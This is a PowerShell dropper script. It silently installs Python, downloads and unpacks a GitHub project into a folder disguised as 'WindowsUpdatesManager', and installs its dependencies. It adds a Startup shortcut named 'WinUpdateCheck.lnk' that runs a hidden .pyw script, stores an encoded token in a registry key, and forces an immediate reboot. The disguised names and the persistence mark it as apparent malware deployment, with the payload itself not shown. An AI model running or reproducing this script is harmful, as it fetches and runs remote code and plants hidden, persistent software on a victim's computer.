$prjRl = "https://github.com/richa-z/Snky/archive/refs/heads/main.zip"
$ptnRl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
$ptnIn = "$($env:TEMP)\python.exe"
$rp = "HKCU:\Software\WindowsUpdatesManager"
$pn = "a"
$pp = "GZipped, Base 64 Encoded token here"

Invoke-WebRequest -Uri $ptnRl -OutFile $ptnIn

Start-Process -FilePath $ptnIn -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0" -Wait
$pyp = Join-Path $env:ProgramFiles "Python310"
[System.Environment]::SetEnvironmentVariable("Path", "$($env:Path);$pyp","User")

Invoke-WebRequest -Uri $prjRl -OutFile "$($env:TEMP)\program.zip"
Expand-Archive -Path "$($env:TEMP)\program.zip" -DestinationPath "$($env:LOCALAPPDATA)\WindowsUpdatesManager" -Force
cmd.exe /c python -m pip install --upgrade pip
cmd.exe /c pip install -r "$($env:LOCALAPPDATA)\WindowsUpdatesManager\Snky-main\requirements.txt"

$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$($env:APPDATA)\Microsoft\Windows\Start Menu\Programs\Startup\WinUpdateCheck.lnk")
$Shortcut.TargetPath = "$($env:LOCALAPPDATA)\WindowsUpdatesManager\Snky-main\main.pyw"
$Shortcut.Save()

if (!(Test-Path $rp)) {
    New-Item -Path $rp -Force | Out-Null
}

New-Item -Path $rp

New-ItemProperty -Path $rp -Name $pn -Value $pp -PropertyType String -Force | Out-Null

cmd.exe /c shutdown /r /t 0


